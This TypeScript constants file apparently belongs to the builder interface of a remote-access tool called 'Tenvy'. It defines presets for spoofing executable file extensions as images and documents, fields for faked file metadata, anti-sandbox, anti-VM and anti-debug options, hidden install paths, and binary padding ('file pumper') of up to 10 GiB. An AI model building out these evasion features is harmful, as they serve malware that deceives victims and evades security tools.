import {
	ALLOWED_EXTENSIONS_BY_OS,
	TARGET_ARCHITECTURES_BY_OS,
	TARGET_OS_VALUES,
	type TargetArch,
	type TargetOS
} from '../../../../../../shared/types/build';

export type { TargetArch, TargetOS } from '../../../../../../shared/types/build';

const TARGET_OS_LABELS: Record<TargetOS, string> = {
	windows: 'Windows',
	linux: 'Linux',
	darwin: 'macOS'
};

export const TARGET_OS_OPTIONS = TARGET_OS_VALUES.map((value) => ({
	value,
	label: TARGET_OS_LABELS[value]
})) as readonly { value: TargetOS; label: string }[];

export const EXTENSION_OPTIONS_BY_OS = ALLOWED_EXTENSIONS_BY_OS;

const ARCHITECTURE_LABELS: Record<TargetArch, string> = {
	amd64: 'x64',
	'386': 'x86',
	arm64: 'ARM64'
};

const formatArchitectureLabel = (os: TargetOS, arch: TargetArch): string => {
	if (os === 'darwin' && arch === 'amd64') {
		return 'Intel (x64)';
	}

	if (os === 'darwin' && arch === 'arm64') {
		return 'Apple Silicon (ARM64)';
	}

	return ARCHITECTURE_LABELS[arch];
};

const createArchitectureOptions = (os: TargetOS): readonly { value: TargetArch; label: string }[] =>
	TARGET_ARCHITECTURES_BY_OS[os].map((arch) => ({
		value: arch,
		label: formatArchitectureLabel(os, arch)
	}));

export const ARCHITECTURE_OPTIONS_BY_OS = {
	windows: createArchitectureOptions('windows'),
	linux: createArchitectureOptions('linux'),
	darwin: createArchitectureOptions('darwin')
} satisfies Record<TargetOS, readonly { value: TargetArch; label: string }[]>;

export const EXTENSION_SPOOF_PRESETS = [
	'.jpg',
	'.png',
	'.msi',
	'.pdf',
	'.docx',
	'.xlsx',
	'.pptx',
	'.zip',
	'.mp3',
	'.mp4'
] as const;

export type ExtensionSpoofPreset = (typeof EXTENSION_SPOOF_PRESETS)[number];

export const DEFAULT_FILE_INFORMATION = {
	fileDescription: '',
	productName: '',
	companyName: '',
	productVersion: '',
	fileVersion: '',
	originalFilename: '',
	internalName: '',
	legalCopyright: ''
} as const;

export const ANTI_TAMPER_BADGES = ['Anti-Sandbox', 'Anti-VM', 'Anti-Debug'] as const;

export const INSTALLATION_PATH_PRESETS = [
	{ label: '%AppData%\\Tenvy', value: '%AppData%\\Tenvy' },
	{ label: '%USERPROFILE%\\Tenvy', value: '%USERPROFILE%\\Tenvy' },
	{ label: '~/.config/tenvy', value: '~/.config/tenvy' }
] as const;

export const FILE_PUMPER_UNITS = ['KB', 'MB', 'GB'] as const;

export type FilePumperUnit = (typeof FILE_PUMPER_UNITS)[number];

export const FILE_PUMPER_UNIT_TO_BYTES: Record<FilePumperUnit, number> = {
	KB: 1024,
	MB: 1024 * 1024,
	GB: 1024 * 1024 * 1024
};

export const MAX_FILE_PUMPER_BYTES = 10 * 1024 * 1024 * 1024; // 10 GiB ceiling for padded binaries

export type HeaderKV = { key: string; value: string };
export type CookieKV = { name: string; value: string };

export const INPUT_FIELD_CLASSES =
	'flex h-9 w-full min-w-0 rounded-md border border-input bg-background px-3 py-1 text-base shadow-xs ring-offset-background transition-[color,box-shadow] outline-none selection:bg-primary selection:text-primary-foreground placeholder:text-muted-foreground disabled:cursor-not-allowed disabled:opacity-50 md:text-sm dark:bg-input/30 focus-visible:border-ring focus-visible:ring-[3px] focus-visible:ring-ring/50 aria-invalid:border-destructive aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40';
